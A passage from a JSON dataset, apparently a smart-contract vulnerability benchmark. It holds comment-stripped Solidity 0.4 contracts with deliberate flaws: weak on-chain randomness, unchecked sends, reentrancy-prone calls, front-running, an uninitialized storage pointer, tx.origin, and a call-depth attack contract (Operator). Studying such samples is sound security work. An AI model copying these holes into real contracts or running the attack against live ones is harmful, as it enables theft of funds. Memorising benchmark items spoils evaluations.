      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract SingleFuncRegistry {\naddress[] listAddresses;\nfunction ifillArray() public returns (bool){\nif(listAddresses.length<1500) {\nfor(uint i=0;i<350;i++) {\nlistAddresses.push(msg.sender);\n}\nreturn true;\n} else {\nlistAddresses = new address[](0);\nreturn false;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 20,
        "transformed_lines": 15,
        "original_chars": 440,
        "transformed_chars": 292,
        "compression_ratio": 0.66
      },
      "error": null
    },
    {
      "original_id": "sn_ds_154",
      "transformed_id": "ss_l1_compressed_sn_ds_154",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract Government {\nuint32 public lastCreditorPayedOut;\nuint public lastTimeOfNewCredit;\nuint public profitFromCrash;\naddress[] public creditorAddresses;\nuint[] public creditorAmounts;\naddress public corruptElite;\nmapping (address => uint) buddies;\nuint constant TWELVE_HOURS = 43200;\nuint8 public round;\nfunction Government() {\nprofitFromCrash = msg.value;\ncorruptElite = msg.sender;\nlastTimeOfNewCredit = block.timestamp;\n}\nfunction lendGovernmentMoney(address buddy) returns (bool) {\nuint amount = msg.value;\nif (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp) {\nmsg.sender.send(amount);\ncreditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);\ncorruptElite.send(this.balance);\nlastCreditorPayedOut = 0;\nlastTimeOfNewCredit = block.timestamp;\nprofitFromCrash = 0;\ncreditorAddresses = new address[](0);\ncreditorAmounts = new uint[](0);\nround += 1;\nreturn false;\n}\nelse {\nif (amount >= 10 ** 18) {\nlastTimeOfNewCredit = block.timestamp;\ncreditorAddresses.push(msg.sender);\ncreditorAmounts.push(amount * 110 / 100);\ncorruptElite.send(amount * 5/100);\nif (profitFromCrash < 10000 * 10**18) {\nprofitFromCrash += amount * 5/100;\n}\nif(buddies[buddy] >= amount) {\nbuddy.send(amount * 5/100);\n}\nbuddies[msg.sender] += amount * 110 / 100;\nif (creditorAmounts[lastCreditorPayedOut] <= address(this).balance - profitFromCrash) {\ncreditorAddresses[lastCreditorPayedOut].send(creditorAmounts[lastCreditorPayedOut]);\nbuddies[creditorAddresses[lastCreditorPayedOut]] -= creditorAmounts[lastCreditorPayedOut];\nlastCreditorPayedOut += 1;\n}\nreturn true;\n}\nelse {\nmsg.sender.send(amount);\nreturn false;\n}\n}\n}\nfunction() {\nlendGovernmentMoney(0);\n}\nfunction totalDebt() returns (uint debt) {\nfor(uint i=lastCreditorPayedOut; i<creditorAmounts.length; i++){\ndebt += creditorAmounts[i];\n}\n}\nfunction totalPayedOut() returns (uint payout) {\nfor(uint i=0; i<lastCreditorPayedOut; i++){\npayout += creditorAmounts[i];\n}\n}\nfunction investInTheSystem() {\nprofitFromCrash += msg.value;\n}\nfunction inheritToNextGeneration(address nextGeneration) {\nif (msg.sender == corruptElite) {\ncorruptElite = nextGeneration;\n}\n}\nfunction getCreditorAddresses() returns (address[]) {\nreturn creditorAddresses;\n}\nfunction getCreditorAmounts() returns (uint[]) {\nreturn creditorAmounts;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 116,
        "transformed_lines": 84,
        "original_chars": 4642,
        "transformed_chars": 2293,
        "compression_ratio": 0.49
      },
      "error": null
    },
    {
      "original_id": "sn_ds_155",
      "transformed_id": "ss_l1_compressed_sn_ds_155",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.4.24;\ncontract Refunder {\naddress[] private refundAddresses;\nmapping (address => uint) public refunds;\nconstructor() {\nrefundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);\nrefundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);\n}\nfunction refundAll() public {\nfor(uint x; x < refundAddresses.length; x++) {\nrequire(refundAddresses[x].send(refunds[refundAddresses[x]]));\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 21,
        "transformed_lines": 14,
        "original_chars": 662,
        "transformed_chars": 416,
        "compression_ratio": 0.63
      },
      "error": null
    },
    {
      "original_id": "sn_ds_156",
      "transformed_id": "ss_l1_compressed_sn_ds_156",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\nlibrary SafeMath {\nfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\nif (a == 0) {\nreturn 0;\n}\nuint256 c = a * b;\nrequire(c / a == b);\nreturn c;\n}\nfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\nrequire(b > 0);\nuint256 c = a / b;\nreturn c;\n}\nfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\nrequire(b <= a);\nuint256 c = a - b;\nreturn c;\n}\nfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\nuint256 c = a + b;\nrequire(c >= a);\nreturn c;\n}\nfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\nrequire(b != 0);\nreturn a % b;\n}\n}\ncontract ERC20 {\nevent Transfer( address indexed from, address indexed to, uint256 value );\nevent Approval( address indexed owner, address indexed spender, uint256 value);\nusing SafeMath for *;\nmapping (address => uint256) private _balances;\nmapping (address => mapping (address => uint256)) private _allowed;\nuint256 private _totalSupply;\nconstructor(uint totalSupply){\n_balances[msg.sender] = totalSupply;\n}\nfunction balanceOf(address owner) public view returns (uint256) {\nreturn _balances[owner];\n}\nfunction allowance(address owner, address spender) public view returns (uint256) {\nreturn _allowed[owner][spender];\n}\nfunction transfer(address to, uint256 value) public returns (bool) {\nrequire(value <= _balances[msg.sender]);\nrequire(to != address(0));\n_balances[msg.sender] = _balances[msg.sender].sub(value);\n_balances[to] = _balances[to].add(value);\nemit Transfer(msg.sender, to, value);\nreturn true;\n}\nfunction approve(address spender, uint256 value) public returns (bool) {\nrequire(spender != address(0));\n_allowed[msg.sender][spender] = value;\nemit Approval(msg.sender, spender, value);\nreturn true;\n}\nfunction transferFrom(address from, address to, uint256 value) public returns (bool) {\nrequire(value <= _balances[from]);\nrequire(value <= _allowed[from][msg.sender]);\nrequire(to != address(0));\n_balances[from] = _balances[from].sub(value);\n_balances[to] = _balances[to].add(value);\n_allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\nemit Transfer(from, to, value);\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 26,
        "mode": "compressed",
        "original_lines": 101,
        "transformed_lines": 71,
        "original_chars": 2770,
        "transformed_chars": 2157,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_157",
      "transformed_id": "ss_l1_compressed_sn_ds_157",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.22;\ncontract FindThisHash {\nbytes32 constant public hash = 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;\nconstructor() public payable {}\nfunction solve(string solution) public {\nrequire(hash == sha3(solution));\nmsg.sender.transfer(1000 ether);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 9,
        "original_chars": 449,
        "transformed_chars": 290,
        "compression_ratio": 0.65
      },
      "error": null
    },
    {
      "original_id": "sn_ds_158",
      "transformed_id": "ss_l1_compressed_sn_ds_158",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract EthTxOrderDependenceMinimal {\naddress public owner;\nbool public claimed;\nuint public reward;\nfunction EthTxOrderDependenceMinimal() public {\nowner = msg.sender;\n}\nfunction setReward() public payable {\nrequire (!claimed);\nrequire(msg.sender == owner);\nowner.transfer(reward);\nreward = msg.value;\n}\nfunction claimReward(uint256 submission) {\nrequire (!claimed);\nrequire(submission < 10);\nmsg.sender.transfer(reward);\nclaimed = true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 27,
        "transformed_lines": 21,
        "original_chars": 613,
        "transformed_chars": 468,
        "compression_ratio": 0.76
      },
      "error": null
    },
    {
      "original_id": "sn_ds_159",
      "transformed_id": "ss_l1_compressed_sn_ds_159",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.2;\ncontract OddsAndEvens{\nstruct Player {\naddress addr;\nuint number;\n}\nPlayer[2] public players;\nuint8 tot;\naddress owner;\nfunction OddsAndEvens() {\nowner = msg.sender;\n}\nfunction play(uint number) payable{\nif (msg.value != 1 ether) throw;\nplayers[tot] = Player(msg.sender, number);\ntot++;\nif (tot==2) andTheWinnerIs();\n}\nfunction andTheWinnerIs() private {\nbool res ;\nuint n = players[0].number+players[1].number;\nif (n%2==0) {\nres = players[0].addr.send(1800 finney);\n}\nelse {\nres = players[1].addr.send(1800 finney);\n}\ndelete players;\ntot=0;\n}\nfunction getProfit() {\nif(msg.sender!=owner) throw;\nbool res = msg.sender.send(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 11,
        "mode": "compressed",
        "original_lines": 46,
        "transformed_lines": 35,
        "original_chars": 853,
        "transformed_chars": 665,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_160",
      "transformed_id": "ss_l1_compressed_sn_ds_160",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract CryptoRoulette {\nuint256 private secretNumber;\nuint256 public lastPlayed;\nuint256 public betPrice = 0.1 ether;\naddress public ownerAddr;\nstruct Game {\naddress player;\nuint256 number;\n}\nGame[] public gamesPlayed;\nfunction CryptoRoulette() public {\nownerAddr = msg.sender;\nshuffle();\n}\nfunction shuffle() internal {\nsecretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;\n}\nfunction play(uint256 number) payable public {\nrequire(msg.value >= betPrice && number <= 10);\nGame game;\ngame.player = msg.sender;\ngame.number = number;\ngamesPlayed.push(game);\nif (number == secretNumber) {\nmsg.sender.transfer(this.balance);\n}\nshuffle();\nlastPlayed = now;\n}\nfunction kill() public {\nif (msg.sender == ownerAddr && now > lastPlayed + 1 days) {\nsuicide(msg.sender);\n}\n}\nfunction() public payable { }\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 57,
        "transformed_lines": 37,
        "original_chars": 1440,
        "transformed_chars": 842,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_ds_161",
      "transformed_id": "ss_l1_compressed_sn_ds_161",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract NameRegistrar {\nbool public unlocked = false;\nstruct NameRecord {\nbytes32 name;\naddress mappedAddress;\n}\nmapping(address => NameRecord) public registeredNameRecord;\nmapping(bytes32 => address) public resolve;\nfunction register(bytes32 _name, address _mappedAddress) public {\nNameRecord newRecord;\nnewRecord.name = _name;\nnewRecord.mappedAddress = _mappedAddress;\nresolve[_name] = _mappedAddress;\nregisteredNameRecord[msg.sender] = newRecord;\nrequire(unlocked);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 8,
        "mode": "compressed",
        "original_lines": 26,
        "transformed_lines": 18,
        "original_chars": 815,
        "transformed_chars": 498,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_ds_162",
      "transformed_id": "ss_l1_compressed_sn_ds_162",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract OpenAddressLottery{\nstruct SeedComponents{\nuint component1;\nuint component2;\nuint component3;\nuint component4;\n}\naddress owner;\nuint private secretSeed;\nuint private lastReseed;\nuint LuckyNumber = 7;\nmapping (address => bool) winner;\nfunction OpenAddressLottery() {\nowner = msg.sender;\nreseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));\n}\nfunction participate() payable {\nif(msg.value<0.1 ether)\nreturn;\nrequire(winner[msg.sender] == false);\nif(luckyNumberOfAddress(msg.sender) == LuckyNumber){\nwinner[msg.sender] = true;\nuint win=msg.value*7;\nif(win>this.balance)\nwin=this.balance;\nmsg.sender.transfer(win);\n}\nif(block.number-lastReseed>1000)\nreseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));\n}\nfunction luckyNumberOfAddress(address addr) constant returns(uint n){\nn = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\n}\nfunction reseed(SeedComponents components) internal {\nsecretSeed = uint256(keccak256(\ncomponents.component1,\ncomponents.component2,\ncomponents.component3,\ncomponents.component4\n));\nlastReseed = block.number;\n}\nfunction kill() {\nrequire(msg.sender==owner);\nselfdestruct(msg.sender);\n}\nfunction forceReseed() {\nrequire(msg.sender==owner);\nSeedComponents s;\ns.component1 = uint(msg.sender);\ns.component2 = uint256(block.blockhash(block.number - 1));\ns.component3 = block.difficulty*(uint)(block.coinbase);\ns.component4 = tx.gasprice * 7;\nreseed(s);\n}\nfunction () payable {\nif(msg.value>=0.1 ether && msg.sender!=owner)\nparticipate();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 21,
        "mode": "compressed",
        "original_lines": 83,
        "transformed_lines": 61,
        "original_chars": 2971,
        "transformed_chars": 1585,
        "compression_ratio": 0.53
      },
      "error": null
    },
    {
      "original_id": "sn_ds_163",
      "transformed_id": "ss_l1_compressed_sn_ds_163",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.11;\ncontract MyToken {\nmapping (address => uint) balances;\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nfunction MyToken() {\nbalances[tx.origin] = 10000;\n}\nfunction sendCoin(address to, uint amount) returns(bool sufficient) {\nif (balances[msg.sender] < amount) return false;\nbalances[msg.sender] -= amount;\nbalances[to] += amount;\nTransfer(msg.sender, to, amount);\nreturn true;\n}\nfunction getBalance(address addr) constant returns(uint) {\nreturn balances[addr];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 23,
        "transformed_lines": 18,
        "original_chars": 658,
        "transformed_chars": 517,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_ds_164",
      "transformed_id": "ss_l1_compressed_sn_ds_164",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract EtherLotto {\nuint constant TICKET_AMOUNT = 10;\nuint constant FEE_AMOUNT = 1;\naddress public bank;\nuint public pot;\nfunction EtherLotto() {\nbank = msg.sender;\n}\nfunction play() payable {\nassert(msg.value == TICKET_AMOUNT);\npot += msg.value;\nvar random = uint(sha3(block.timestamp)) % 2;\nif (random == 0) {\nbank.transfer(FEE_AMOUNT);\nmsg.sender.transfer(pot - FEE_AMOUNT);\npot = 0;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 52,
        "transformed_lines": 20,
        "original_chars": 1425,
        "transformed_chars": 419,
        "compression_ratio": 0.29
      },
      "error": null
    },
    {
      "original_id": "sn_ds_165",
      "transformed_id": "ss_l1_compressed_sn_ds_165",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract Governmental {\naddress public owner;\naddress public lastInvestor;\nuint public jackpot = 1 ether;\nuint public lastInvestmentTimestamp;\nuint public ONE_MINUTE = 1 minutes;\nfunction Governmental() {\nowner = msg.sender;\nif (msg.value<1 ether) throw;\n}\nfunction invest() {\nif (msg.value<jackpot/2) throw;\nlastInvestor = msg.sender;\njackpot += msg.value/2;\nlastInvestmentTimestamp = block.timestamp;\n}\nfunction resetInvestment() {\nif (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)\nthrow;\nlastInvestor.send(jackpot);\nowner.send(this.balance-1 ether);\nlastInvestor = 0;\njackpot = 1 ether;\nlastInvestmentTimestamp = 0;\n}\n}\ncontract Operator {\nfunction operate(address target, uint count) {\nif (0<=count && count<1023) {\nthis.operate.gas(msg.gas-2000)(target, count+1);\n}\nelse {\nGovernmental(target).resetInvestment();\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 9,
        "mode": "compressed",
        "original_lines": 46,
        "transformed_lines": 37,
        "original_chars": 972,
        "transformed_chars": 855,
        "compression_ratio": 0.88
      },
      "error": null
    },
    {
      "original_id": "sn_ds_166",
      "transformed_id": "ss_l1_compressed_sn_ds_166",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract lottopollo {\naddress leader;\nuint timestamp;\nfunction payOut(uint rand) internal {\nif ( rand> 0 && now - rand > 24 hours ) {\nmsg.sender.send( msg.value );\nif ( this.balance > 0 ) {\nleader.send( this.balance );\n}\n}\nelse if ( msg.value >= 1 ether ) {\nleader = msg.sender;\ntimestamp = rand;\n}\n}\nfunction randomGen() constant returns (uint randomNumber) {\nreturn block.timestamp;\n}\nfunction draw(uint seed){\nuint randomNumber=randomGen();\npayOut(randomNumber);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 2,
        "mode": "compressed",
        "original_lines": 26,
        "transformed_lines": 24,
        "original_chars": 615,
        "transformed_chars": 493,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_ds_167",
      "transformed_id": "ss_l1_compressed_sn_ds_167",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract Roulette {\nuint public pastBlockTime;\nconstructor() public payable {}\nfunction () public payable {\nrequire(msg.value == 10 ether);\nrequire(now != pastBlockTime);\npastBlockTime = now;\nif(now % 15 == 0) {\nmsg.sender.transfer(this.balance);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 18,
        "transformed_lines": 13,
        "original_chars": 551,
        "transformed_chars": 277,
        "compression_ratio": 0.5
      },
      "error": null
    },
    {
      "original_id": "sn_ds_168",
      "transformed_id": "ss_l1_compressed_sn_ds_168",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract TimedCrowdsale {\nfunction isSaleFinished() view public returns (bool) {\nreturn block.timestamp >= 1546300800;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 9,
        "transformed_lines": 6,
        "original_chars": 239,
        "transformed_chars": 147,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_169",
      "transformed_id": "ss_l1_compressed_sn_ds_169",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.9;\ncontract TownCrier {\nstruct Request {\naddress requester;\nuint fee;\naddress callbackAddr;\nbytes4 callbackFID;\nbytes32 paramsHash;\n}\nevent Upgrade(address newAddr);\nevent Reset(uint gas_price, uint min_fee, uint cancellation_fee);\nevent RequestInfo(uint64 id, uint8 requestType, address requester, uint fee, address callbackAddr, bytes32 paramsHash, uint timestamp, bytes32[] requestData);\nevent DeliverInfo(uint64 requestId, uint fee, uint gasPrice, uint gasLeft, uint callbackGas, bytes32 paramsHash, uint64 error, bytes32 respData);\nevent Cancel(uint64 requestId, address canceller, address requester, uint fee, int flag);\naddress public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593;\nuint public GAS_PRICE = 5 * 10**10;\nuint public MIN_FEE = 30000 * GAS_PRICE;\nuint public CANCELLATION_FEE = 25000 * GAS_PRICE;\nuint public constant CANCELLED_FEE_FLAG = 1;\nuint public constant DELIVERED_FEE_FLAG = 0;\nint public constant FAIL_FLAG = -2 ** 250;\nint public constant SUCCESS_FLAG = 1;\nbool public killswitch;\nbool public externalCallFlag;\nuint64 public requestCnt;\nuint64 public unrespondedCnt;\nRequest[2**64] public requests;\nint public newVersion = 0;\nfunction () {}\nfunction TownCrier() public {\nrequestCnt = 1;\nrequests[0].requester = msg.sender;\nkillswitch = false;\nunrespondedCnt = 0;\nexternalCallFlag = false;\n}\nfunction upgrade(address newAddr) {\nif (msg.sender == requests[0].requester && unrespondedCnt == 0) {\nnewVersion = -int(newAddr);\nkillswitch = true;\nUpgrade(newAddr);\n}\n}\nfunction reset(uint price, uint minGas, uint cancellationGas) public {\nif (msg.sender == requests[0].requester && unrespondedCnt == 0) {\nGAS_PRICE = price;\nMIN_FEE = price * minGas;\nCANCELLATION_FEE = price * cancellationGas;\nReset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE);\n}\n}\nfunction suspend() public {\nif (msg.sender == requests[0].requester) {\nkillswitch = true;\n}\n}\nfunction restart() public {\nif (msg.sender == requests[0].requester && newVersion == 0) {\nkillswitch = false;\n}\n}\nfunction withdraw() public {\nif (msg.sender == requests[0].requester && unrespondedCnt == 0) {\nif (!requests[0].requester.call.value(this.balance)()) {\nthrow;\n}\n}\n}\nfunction request(uint8 requestType, address callbackAddr, bytes4 callbackFID, uint timestamp, bytes32[] requestData) public payable returns (int) {\nif (externalCallFlag) {\nthrow;\n}\nif (killswitch) {\nexternalCallFlag = true;\nif (!msg.sender.call.value(msg.value)()) {\nthrow;\n}\nexternalCallFlag = false;\nreturn newVersion;\n}\nif (msg.value < MIN_FEE) {\nexternalCallFlag = true;\nif (!msg.sender.call.value(msg.value)()) {\nthrow;\n}\nexternalCallFlag = false;\nreturn FAIL_FLAG;\n} else {\nuint64 requestId = requestCnt;\nrequestCnt++;\nunrespondedCnt++;\nbytes32 paramsHash = sha3(requestType, requestData);\nrequests[requestId].requester = msg.sender;\nrequests[requestId].fee = msg.value;\nrequests[requestId].callbackAddr = callbackAddr;\nrequests[requestId].callbackFID = callbackFID;\nrequests[requestId].paramsHash = paramsHash;\nRequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData);\nreturn requestId;\n}\n}\nfunction deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {\nif (msg.sender != SGX_ADDRESS ||\nrequestId <= 0 ||\nrequests[requestId].requester == 0 ||\nrequests[requestId].fee == DELIVERED_FEE_FLAG) {\nreturn;\n}\nuint fee = requests[requestId].fee;\nif (requests[requestId].paramsHash != paramsHash) {\nreturn;\n} else if (fee == CANCELLED_FEE_FLAG) {\nSGX_ADDRESS.send(CANCELLATION_FEE);\nrequests[requestId].fee = DELIVERED_FEE_FLAG;\nunrespondedCnt--;\nreturn;\n}\nrequests[requestId].fee = DELIVERED_FEE_FLAG;\nunrespondedCnt--;\nif (error < 2) {\nSGX_ADDRESS.send(fee);\n} else {\nexternalCallFlag = true;\nrequests[requestId].requester.call.gas(2300).value(fee)();\nexternalCallFlag = false;\n}\nuint callbackGas = (fee - MIN_FEE) / tx.gasprice;\nDeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData);\nif (callbackGas > msg.gas - 5000) {\ncallbackGas = msg.gas - 5000;\n}\nexternalCallFlag = true;\nrequests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData);\nexternalCallFlag = false;\n}\nfunction cancel(uint64 requestId) public returns (int) {\nif (externalCallFlag) {\nthrow;\n}\nif (killswitch) {\nreturn 0;\n}\nuint fee = requests[requestId].fee;\nif (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) {\nrequests[requestId].fee = CANCELLED_FEE_FLAG;\nexternalCallFlag = true;\nif (!msg.sender.call.value(fee - CANCELLATION_FEE)()) {\nthrow;\n}\nexternalCallFlag = false;\nCancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1);\nreturn SUCCESS_FLAG;\n} else {\nCancel(requestId, msg.sender, requests[requestId].requester, fee, -1);\nreturn FAIL_FLAG;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 40,
        "mode": "compressed",
        "original_lines": 213,
        "transformed_lines": 158,
        "original_chars": 8583,
        "transformed_chars": 4837,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_ds_170",
      "transformed_id": "ss_l1_compressed_sn_ds_170",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract Owned {\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\naddress public owner;\nfunction Owned() {\nowner = msg.sender;\n}\naddress public newOwner;\nfunction changeOwner(address _newOwner) onlyOwner {\nnewOwner = _newOwner;\n}\nfunction acceptOwnership() {\nif (msg.sender == newOwner) {\nowner = newOwner;\n}\n}\nfunction execute(address _dst, uint _value, bytes _data) onlyOwner {\n_dst.call.value(_value)(_data);\n}\n}\ncontract Marriage is Owned {\nstring public partner1;\nstring public partner2;\nuint public marriageDate;\nstring public marriageStatus;\nstring public vows;\nEvent[] public majorEvents;\nMessage[] public messages;\nstruct Event {\nuint date;\nstring name;\nstring description;\nstring url;\n}\nstruct Message {\nuint date;\nstring nameFrom;\nstring text;\nstring url;\nuint value;\n}\nmodifier areMarried {\nrequire(sha3(marriageStatus) == sha3(\"Married\"));\n_;\n}\nfunction Marriage(address _owner) {\nowner = _owner;\n}\nfunction numberOfMajorEvents() constant public returns (uint) {\nreturn majorEvents.length;\n}\nfunction numberOfMessages() constant public returns (uint) {\nreturn messages.length;\n}\nfunction createMarriage(\nstring _partner1,\nstring _partner2,\nstring _vows,\nstring url) onlyOwner {\nrequire(majorEvents.length == 0);\npartner1 = _partner1;\npartner2 = _partner2;\nmarriageDate = now;\nvows = _vows;\nmarriageStatus = \"Married\";\nmajorEvents.push(Event(now, \"Marriage\", vows, url));\nMajorEvent(\"Marrigage\", vows, url);\n}\nfunction setStatus(string status, string url) onlyOwner {\nmarriageStatus = status;\nsetMajorEvent(\"Changed Status\", status, url);\n}\nfunction setMajorEvent(string name, string description, string url) onlyOwner areMarried {\nmajorEvents.push(Event(now, name, description, url));\nMajorEvent(name, description, url);\n}\nfunction sendMessage(string nameFrom, string text, string url) payable areMarried {\nif (msg.value > 0) {\nowner.transfer(this.balance);\n}\nmessages.push(Message(now, nameFrom, text, url, msg.value));\nMessageSent(nameFrom, text, url, msg.value);\n}\nevent MajorEvent(string name, string description, string url);\nevent MessageSent(string name, string description, string url, uint value);\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 23,
        "mode": "compressed",
        "original_lines": 140,
        "transformed_lines": 89,
        "original_chars": 4043,
        "transformed_chars": 2155,
        "compression_ratio": 0.53
      },
      "error": null
    },
    {
      "original_id": "sn_ds_171",
      "transformed_id": "ss_l1_compressed_sn_ds_171",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract Splitter{\naddress public owner;\naddress[] public puppets;\nmapping (uint256 => address) public extra;\naddress private _addy;\nuint256 private _share;\nuint256 private _count;\nconstructor() payable public{\nowner = msg.sender;\nnewPuppet();\nnewPuppet();\nnewPuppet();\nnewPuppet();\nextra[0] = puppets[0];\nextra[1] = puppets[1];\nextra[2] = puppets[2];\nextra[3] = puppets[3];\n}\nfunction withdraw() public{\nrequire(msg.sender == owner);\nowner.transfer(address(this).balance);\n}\nfunction getPuppetCount() public constant returns(uint256 puppetCount){\nreturn puppets.length;\n}\nfunction newPuppet() public returns(address newPuppet){\nrequire(msg.sender == owner);\nPuppet p = new Puppet();\npuppets.push(p);\nreturn p;\n}\nfunction setExtra(uint256 _id, address _newExtra) public {\nrequire(_newExtra != address(0));\nextra[_id] = _newExtra;\n}\nfunction fundPuppets() public payable {\nrequire(msg.sender == owner);\n_share = SafeMath.div(msg.value, 4);\nextra[0].call.value(_share).gas(800000)();\nextra[1].call.value(_share).gas(800000)();\nextra[2].call.value(_share).gas(800000)();\nextra[3].call.value(_share).gas(800000)();\n}\nfunction() payable public{\n}\n}\ncontract Puppet {\nmapping (uint256 => address) public target;\nmapping (uint256 => 